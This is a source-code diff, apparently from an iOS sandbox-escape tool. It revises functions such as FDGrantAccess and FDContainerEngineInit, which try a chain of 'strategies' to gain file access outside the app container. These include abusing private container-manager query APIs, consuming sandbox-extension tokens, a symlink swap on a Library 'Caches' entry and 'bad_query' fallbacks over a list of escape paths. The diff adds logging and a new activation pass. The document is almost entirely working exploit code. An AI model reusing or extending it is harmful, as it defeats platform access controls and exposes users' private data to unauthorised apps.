@@ -269,13 +269,19 @@ static int64_t _worseQuerySymlink(const char *targetPath) {
                   : rawG;
             NSString *groupID = [NSString stringWithUTF8String:rtGroups[g]];
             NSURL *containerURL = [fm containerURLForSecurityApplicationGroupIdentifier:groupID];
-            if (!containerURL) continue;
+            if (!containerURL) {
+                NSLog(@"[FD-SYM] no container for group %@ (g=%d)", groupID, g);
+                continue;
+            }
 
             NSString *libraryPath = [containerURL.path
                                      stringByAppendingPathComponent:@"Library"];
             int libraryFd = open(libraryPath.fileSystemRepresentation,
                                  O_RDONLY | O_DIRECTORY | O_CLOEXEC);
-            if (libraryFd < 0) continue;
+            if (libraryFd < 0) {
+                NSLog(@"[FD-SYM] cannot open Library fd g[%d] errno=%d", g, errno);
+                continue;
+            }
 
             for (int oi = 0; oi < kFlagCount; oi++) {
                 int fi;
@@ -323,8 +329,17 @@ static int64_t _worseQuerySymlink(const char *targetPath) {
                     char *token = api->objectCopyToken ? api->objectCopyToken(res) : NULL;
                     if (token && token[0]) {
                         handle = consumeExt(token);
+                        NSLog(@"[FD-SYM] g[%d] f=%d handle=%lld target=%s",
+                              g, fi, (long long)handle, targetPath);
+                    } else {
+                        NSLog(@"[FD-SYM] g[%d] f=%d no token target=%s", g, fi, targetPath);
                     }
                     free(token);
+                } else {
+                    void *qErr = api->queryGetLastError ? api->queryGetLastError(q) : NULL;
+                    int posix = qErr && api->errorGetPOSIX ? api->errorGetPOSIX(qErr) : 0;
+                    NSLog(@"[FD-SYM] g[%d] f=%d NULL posix=%d target=%s",
+                          g, fi, posix, targetPath);
                 }
 
                 unlinkat(libraryFd, "Caches", 0);
@@ -343,6 +358,8 @@ static int64_t _worseQuerySymlink(const char *targetPath) {
                         close(libraryFd);
                         return handle;
                     }
+                    NSLog(@"[FD-SYM] g[%d] f=%d handle=%lld but open errno=%d %s",
+                          g, fi, (long long)handle, errno, targetPath);
                     if (releaseExt) releaseExt(handle);
                 }
             }
@@ -557,120 +574,7 @@ int64_t FDGrantAccess(const char *path) {
         _diagAppend("ISSUE fail | ");
     }
 
-    // Strategy 4: MCM class-2 activate (per-bundle-ID)
-    if (api->queryCreate && api->objectCopy && api->objectActivate) {
-        static const uint64_t kC2Flags[] = { 0x900000000ULL, 0x8100000000ULL };
-        for (int fi = 0; fi < 2; fi++) {
-            void *q = api->queryCreate();
-            if (!q) continue;
-            api->querySetClass(q, 2);
-            xpc_object_t xid = xpc_string_create(pathC);
-            api->querySetIdentifiers(q, xid);
-            api->querySetFlags(q, kC2Flags[fi]);
-            if (api->querySetPart) api->querySetPart(q, 0);
-
-            void *res = api->queryGetSingle(q);
-            if (res) {
-                // 4a: activate(false)
-                void *act = api->objectCopy(res);
-                if (act) {
-                    bool ok = api->objectActivate(act, false);
-                    if (ok) {
-                        int fd = open(pathC, O_RDONLY | O_CLOEXEC);
-                        if (fd >= 0) {
-                            close(fd);
-                            _storeLease(api, q, act, "mcm-c2", pathC);
-                            xpc_release(xid);
-                            _diagAppend("MCM-C2 act(f) OK f=%d", fi);
-                            return 9200 + fi;
-                        }
-                    }
-                    if (api->objectFree) api->objectFree(act);
-                }
-                // 4b: activate(true) — force mode
-                act = api->objectCopy(res);
-                if (act) {
-                    bool ok = api->objectActivate(act, true);
-                    if (ok) {
-                        int fd = open(pathC, O_RDONLY | O_CLOEXEC);
-                        if (fd >= 0) {
-                            close(fd);
-                            _storeLease(api, q, act, "mcm-c2-force", pathC);
-                            xpc_release(xid);
-                            _diagAppend("MCM-C2 act(t) OK f=%d", fi);
-                            return 9210 + fi;
-                        }
-                    }
-                    if (api->objectFree) api->objectFree(act);
-                }
-                // 4c: raw token consume
-                if (api->objectCopyToken && consumeExt) {
-                    char *token = api->objectCopyToken(res);
-                    if (token && token[0]) {
-                        int64_t h = consumeExt(token);
-                        if (h >= 0) {
-                            int fd = open(pathC, O_RDONLY | O_CLOEXEC);
-                            if (fd >= 0) {
-                                close(fd);
-                                _diagAppend("MCM-C2 consume OK h=%lld f=%d", (long long)h, fi);
-                                free(token);
-                                _storeLease(api, q, NULL, "mcm-c2-tok", pathC);
-                                xpc_release(xid);
-                                return h;
-                            }
-                        }
-                        if (h >= 0 && releaseExt) releaseExt(h);
-                    }
-                    free(token);
-                }
-            }
-            xpc_release(xid);
-            api->queryFree(q);
-        }
-        _diagAppend("MCM-C2 fail | ");
-    }
-
-    // Strategy 5: MCM class-2 with different part values (1,2,3)
-    if (api->queryCreate && api->querySetPart && api->objectCopyToken && consumeExt) {
-        static const uint64_t kPartFlags[] = { 0x900000000ULL, 0x8100000000ULL };
-        for (int fi = 0; fi < 2; fi++) {
-            for (uint64_t part = 1; part <= 3; part++) {
-                void *q = api->queryCreate();
-                if (!q) continue;
-                api->querySetClass(q, 2);
-                xpc_object_t xid = xpc_string_create(pathC);
-                api->querySetIdentifiers(q, xid);
-                api->querySetFlags(q, kPartFlags[fi]);
-                api->querySetPart(q, part);
-
-                void *res = api->queryGetSingle(q);
-                if (res) {
-                    char *token = api->objectCopyToken(res);
-                    if (token && token[0]) {
-                        int64_t h = consumeExt(token);
-                        if (h >= 0) {
-                            int fd = open(pathC, O_RDONLY | O_CLOEXEC);
-                            if (fd >= 0) {
-                                close(fd);
-                                _diagAppend("MCM-C2-P%llu OK h=%lld", part, (long long)h);
-                                free(token);
-                                _storeLease(api, q, NULL, "mcm-c2-part", pathC);
-                                xpc_release(xid);
-                                return h;
-                            }
-                        }
-                        if (h >= 0 && releaseExt) releaseExt(h);
-                    }
-                    free(token);
-                }
-                xpc_release(xid);
-                api->queryFree(q);
-            }
-        }
-        _diagAppend("MCM-C2-parts fail | ");
-    }
-
-    // Strategy 6: MCM class-7 app group activation (with force mode)
+    // Strategy 4: MCM class-7 app group activation (with force mode)
     const char **rtGroups; int rtGroupCount;
     _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
     if (api->queryCreate && api->querySetGroupIdentifiers && api->objectActivate) {
@@ -730,7 +634,7 @@ int64_t FDGrantAccess(const char *path) {
         _diagAppend("MCM-C7 fail | ");
     }
 
-    // Strategy 7: bad_query class-13
+    // Strategy 5: bad_query class-13
     {
         int64_t h = bad_query((char *)pathC, true, NULL, false);
         if (h >= 0) {
@@ -740,7 +644,7 @@ int64_t FDGrantAccess(const char *path) {
         _diagAppend("BQ-C13 fail | ");
     }
 
-    // Strategy 8: bad_query class-7 per app group
+    // Strategy 6: bad_query class-7 per app group
     for (int g = 0; g < rtGroupCount; g++) {
         int64_t h = bad_query((char *)pathC, true, (char *)rtGroups[g], false);
         if (h >= 0) {
@@ -754,7 +658,7 @@ int64_t FDGrantAccess(const char *path) {
         }
     }
 
-    // Strategy 9: Direct open() hail mary
+    // Strategy 7: Direct open() hail mary
     {
         int flags[] = { O_RDONLY, O_RDONLY | O_DIRECTORY, O_RDONLY | O_CLOEXEC };
         for (int i = 0; i < 3; i++) {
@@ -767,7 +671,7 @@ int64_t FDGrantAccess(const char *path) {
         }
     }
 
-    // Strategy 10: Try parent directory then re-check
+    // Strategy 8: Try parent directory then re-check
     {
         NSString *parent = [cleanPath stringByDeletingLastPathComponent];
         if (parent.length > 1) {
@@ -1124,7 +1028,7 @@ NSString *FDDiscoverContainerPath(NSString *bundleID) {
 
 #pragma mark - FDContainerEngineInit
 
-void FDContainerEngineInit(void) {
+int FDContainerEngineInit(void) {
     FDLog(@"Initializing container engine...");
     _diagReset();
 
@@ -1137,13 +1041,16 @@ void FDContainerEngineInit(void) {
     int n = sizeof(kEscapePaths) / sizeof(kEscapePaths[0]);
     int granted = 0;
 
-    // Pass 1: WQ-SYM on all paths
+    // Pass 1: WQ-SYM on all paths (primary for iOS 27+)
     for (int i = 0; i < n; i++) {
         int64_t h = _worseQuerySymlink(kEscapePaths[i]);
         if (h >= 0) {
             granted++;
             _diagAppend("init-sym: %s OK | ", kEscapePaths[i]);
             FDLog([NSString stringWithFormat:@"init WQ-SYM OK: %s h=%lld",
+                   kEscapePaths[i], (long long)h]);
+        } else {
+            FDLog([NSString stringWithFormat:@"init WQ-SYM FAIL: %s rc=%lld",
                    kEscapePaths[i], (long long)h]);
         }
     }
@@ -1161,7 +1068,63 @@ void FDContainerEngineInit(void) {
         }
     }
 
-    // Pass 3: bad_query fallback for paths still not accessible
+    // Pass 3: MCM class-7 app group activation for paths still not accessible
+    {
+        const char **rtGroups; int rtGroupCount;
+        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
+        MCMAPI *api = FDGetAPI();
+        if (api->queryCreate && api->querySetGroupIdentifiers && api->objectActivate) {
+            for (int i = 0; i < n; i++) {
+                int fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
+                if (fd >= 0) { close(fd); continue; }
+                bool got = false;
+                for (int g = 0; g < rtGroupCount && !got; g++) {
+                    static const uint64_t kC7Flags[] = { 0x900000000ULL, 0x8100000000ULL };
+                    for (int fi = 0; fi < 2 && !got; fi++) {
+                        void *q = api->queryCreate();
+                        if (!q) continue;
+                        api->querySetClass(q, 7);
+                        xpc_object_t xid = xpc_string_create(rtGroups[g]);
+                        api->querySetGroupIdentifiers(q, xid);
+                        api->querySetFlags(q, kC7Flags[fi]);
+                        if (api->querySetPart) api->querySetPart(q, 0);
+                        void *res = api->queryGetSingle(q);
+                        if (res && api->objectCopy) {
+                            void *act = api->objectCopy(res);
+                            if (act) {
+                                char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
+                                bool activated = false;
+                                if (token && token[0] != '\0')
+                                    activated = api->objectActivate(act, false);
+                                free(token);
+                                if (activated) {
+                                    fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
+                                    if (fd >= 0) {
+                                        close(fd);
+                                        granted++;
+                                        _storeLease(api, q, act, rtGroups[g], kEscapePaths[i]);
+                                        xpc_release(xid);
+                                        _diagAppend("init-c7: %s OK g[%d] | ", kEscapePaths[i], g);
+                                        FDLog([NSString stringWithFormat:
+                                            @"init MCM-C7 OK: g[%d] f=%d %s", g, fi, kEscapePaths[i]]);
+                                        got = true;
+                                        continue;
+                                    }
+                                }
+                                if (api->objectFree) api->objectFree(act);
+                            }
+                        }
+                        if (!got) {
+                            xpc_release(xid);
+                            api->queryFree(q);
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // Pass 4: bad_query fallback for paths still not accessible
     for (int i = 0; i < n; i++) {
         int fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
         if (fd >= 0) { close(fd); continue; }
@@ -1180,7 +1143,7 @@ void FDContainerEngineInit(void) {
             if (h >= 0) {
                 granted++;
                 _diagAppend("init-bq-ag: %s OK | ", kEscapePaths[i]);
-                FDLog([NSString stringWithFormat:@"init BQ-AG OK: %s", kEscapePaths[i]]);
+                FDLog([NSString stringWithFormat:@"init BQ-AG OK: %s g[%d]", kEscapePaths[i], g]);
                 break;
             }
         }
@@ -1190,12 +1153,19 @@ void FDContainerEngineInit(void) {
     int accessible = 0;
     for (int i = 0; i < n; i++) {
         int fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
-        if (fd >= 0) { close(fd); accessible++; }
+        if (fd >= 0) {
+            close(fd);
+            accessible++;
+            FDLog([NSString stringWithFormat:@"init VERIFY OK: %s", kEscapePaths[i]]);
+        } else {
+            FDLog([NSString stringWithFormat:@"init VERIFY FAIL: %s errno=%d", kEscapePaths[i], errno]);
+        }
     }
 
     _diagAppend("init: granted=%d accessible=%d/%d", granted, accessible, n);
-    FDLog([NSString stringWithFormat:@"Engine init: granted=%d accessible=%d/%d",
+    FDLog([NSString stringWithFormat:@"Engine init DONE: granted=%d accessible=%d/%d",
            granted, accessible, n]);
+    return accessible;
 }
 
 const char *FDLastDiagnostic(void) {
